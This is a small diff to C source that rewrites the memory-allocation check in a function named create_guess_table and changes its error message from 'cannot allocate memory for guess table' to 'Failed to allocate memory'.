@@ -227,8 +227,8 @@ static uint64_t packstate(uint64_t s) {
 /* create_guess_table mallocs the tables */
 static void create_guess_table(void) {
     guesses = (struct guess *)calloc(1, sizeof(struct guess) * maxtablesize);
-    if (!guesses) {
-        printf("cannot allocate memory for guess table\n");
+    if (guesses == NULL) {
+        printf("Failed to allocate memory\n");
         exit(1);
     }
 }
